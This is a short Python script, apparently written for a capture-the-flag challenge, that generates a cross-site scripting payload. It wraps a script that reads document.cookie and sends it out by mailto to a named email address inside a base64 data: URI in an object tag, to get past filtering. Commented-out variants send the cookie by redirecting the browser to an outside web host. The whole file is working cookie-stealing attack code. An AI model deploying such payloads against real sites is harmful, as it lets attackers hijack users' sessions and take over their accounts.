from base64 import b64encode

script = '''<script>
alert(1);
window.open('mailto:b04902053@ntu.edu.tw?subject=flaggg&body=body'+escape(document.cookie));
</script>
'''

# script = '''<script>
# window.location='https://www.csie.ntu.edu.tw/~b04902053/get/?flag='+escape(document.cookie);
# </script>
# '''

# script = '''<script>
# function yeah(){
#     alert(1);
#     console.log(document.cookie);
#     alert('https://www.csie.ntu.edu.tw/~b04902053/get/?flag='+document.cookie);
#     window.location='https://www.csie.ntu.edu.tw/~b04902053/get/?flag='+document.cookie;
# }
# document.addEventListener("DOMContentLoaded", function(event) {
#   yeah();
# });
# </script>
# '''

b64 = b64encode(script.encode()).decode()
payload = '<object data="data:text/html;base64,{}">'.format(b64)
print(payload)
